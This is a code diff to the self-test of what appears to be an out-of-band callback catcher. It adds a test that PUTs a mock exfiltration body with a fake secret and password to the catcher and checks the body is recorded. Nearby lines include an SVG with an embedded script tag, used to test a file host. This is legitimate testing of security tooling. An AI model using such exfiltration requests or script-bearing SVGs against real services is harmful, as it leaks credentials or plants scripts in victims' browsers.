@@ -109,6 +109,19 @@ async def run_selftest() -> bool:
                 body = await r.text()
             chk.ok(r.status == 200 and body.strip() == "ok", "HTTP catcher benign 200")
 
+            # non-GET request body is captured verbatim (any method); use a dedicated
+            # label so the primary token's ledger stays intact for the cursor fixture.
+            exfil = "secret=exfil-42&pw=hunter2"
+            async with sess.put(f"{hurl}/leak", headers={"Host": f"bodycap.{DOMAIN}"},
+                                data=exfil) as r:
+                chk.ok(r.status == 200, "HTTP catcher benign 200 on PUT")
+            async with sess.get(f"{api}/poll?token=bodycap", headers=hdr) as r:
+                bc = await r.json()
+            put_hit = next((i for i in bc["interactions"]
+                            if i["detail"].get("method") == "PUT"), None)
+            chk.ok(put_hit is not None and put_hit["detail"].get("body") == exfil,
+                   "HTTP catcher stores request body regardless of method")
+
             # --- file host ---
             svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'
             async with sess.post(
